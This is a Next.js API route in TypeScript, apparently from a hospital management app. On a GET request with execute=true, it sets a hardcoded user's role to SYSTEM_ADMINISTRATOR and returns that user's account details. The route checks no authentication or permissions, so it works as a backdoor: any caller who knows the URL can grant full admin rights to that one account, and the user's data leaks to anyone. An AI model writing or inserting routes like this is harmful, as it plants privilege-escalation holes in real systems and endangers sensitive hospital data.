import { NextResponse } from "next/server";
import prisma from "@/lib/prisma";

export async function GET(req: Request) {
  try {
    const { searchParams } = new URL(req.url);
    const execute = searchParams.get("execute");

    if (execute === "true") {
      await prisma.user.update({
        where: { email: 'addisulal@gmail.com' },
        data: {
          role: "SYSTEM_ADMINISTRATOR",
          organizationId: null
        }
      });
    }

    const user = await prisma.user.findFirst({
      where: { email: 'addisulal@gmail.com' },
      select: {
        id: true,
        email: true,
        role: true,
        hospitalId: true,
        hospitalName: true,
        organizationId: true,
        isActive: true,
        isApproved: true,
        isFirstLogin: true,
        activationCode: true,
      }
    });

    if (!user) {
      return NextResponse.json({ success: false, error: "User not found" });
    }

    const hasActivationCode = !!user.activationCode;
    const { activationCode, ...safeUser } = user;

    return NextResponse.json({ 
      success: true, 
      user: { ...safeUser, hasActivationCode }
    });
  } catch (error: any) {
    return NextResponse.json({ success: false, error: error.message }, { status: 500 });
  }
}
